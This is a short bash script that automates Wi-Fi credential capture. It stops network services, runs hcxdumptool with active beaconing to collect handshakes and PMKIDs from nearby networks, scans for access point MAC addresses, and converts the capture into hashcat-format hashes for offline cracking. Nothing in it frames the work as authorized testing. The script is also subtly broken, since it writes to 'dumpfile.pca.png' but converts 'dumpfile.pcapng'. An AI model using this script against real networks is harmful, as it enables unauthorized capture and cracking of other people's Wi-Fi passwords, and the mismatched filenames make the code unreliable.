#!/usr/bin/bash

WLAN=$1

echo "STOPPING SERVICES..."
sudo systemctl stop networking.service
sudo systemctl stop wpa_supplicant.service

echo "DUMPING..."
sudo timeout 3s sudo hcxdumptool -i $WLAN -o dumpfile.pca.png --active_beacon --enable_status=15 > dump.log
WLAN="${WLAN}mon"

echo "GETTING MAC ADDRESSES..."
sudo timeout 3s sudo hcxdumptool --do_rcascan --silent -i $WLAN > macs.log

echo "RESTARTING SERVICES..."
sudo systemctl start networking.service
sudo systemctl start wpa_supplicant.service

echo "GENERATING HASHES..."
hcxpcapngtool -o hashes.hc22000 -E essidlist dumpfile.pcapng > genhash.log
